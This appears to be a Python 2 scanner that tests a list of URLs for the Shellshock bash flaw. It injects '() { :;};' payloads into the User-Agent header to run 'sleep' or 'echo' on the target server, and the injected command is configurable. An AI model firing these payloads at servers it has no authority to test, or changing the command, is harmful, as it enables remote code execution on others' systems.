#!/usr/bin/env python
import urllib2
import time
import random
import string

randstr = lambda n: ''.join(random.choice(string.ascii_letters + string.digits) for i in xrange(n))

def timing_attack(url, request_type="HEAD", data=None, headers=None, sleeptime = 3, cmd='() { :;}; env PATH="/bin:/usr/bin:/usr/local/bin:$PATH" sleep %f'):
    request_type = request_type.upper()
    if request_type not in ("HEAD", "GET", "POST"):
        raise Exception("Illegal request type '%s'" % request_type)
    if headers is None: headers = {}
    r = urllib2.Request(url, data, headers)
    r.get_method = lambda : request_type
        
    otime = -time.time()
    response = urllib2.urlopen(r)
    otime += time.time()
    
    # somehow add_header doesn't work for user-agent and py2.7 
    r.add_unredirected_header("User-Agent", cmd % (sleeptime,))
    htime = -time.time()
    response = urllib2.urlopen(r)
    htime += time.time()
    return htime >= sleeptime and htime > otime
    
    
def text_attack(url, request_type="GET", data=None, headers=None):
    request_type = request_type.upper()
    if request_type not in ("GET", "POST"):
        raise Exception("Illegal request type '%s'" % request_type)
    if headers is None: headers = {}
        
    needle = randstr(20)
    r = urllib2.Request(url, data, headers)
    r.add_unredirected_header("User-Agent", '() { :;}; echo \'%s\'' % (needle,))
    r.add_header("User-Agent", '() { :;}; echo \'%s\'' % (needle,))
    r.get_method = lambda : request_type
    
    response = urllib2.urlopen(r)
    return needle in response.read()


def start_server():
     pass
    

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        urls = sys.stdin.readlines()
    else:
        urls = sys.argv[1:]
    
    for url in urls:
        print "- testing:", url
        try:
            print "Timing attack vulnerable:",
            print timing_attack(url, "GET")
            print "Known text attack vulnerable:",
            print text_attack(url, "GET")
            print
            
        except urllib2.HTTPError as he:
            print "Request error:", he
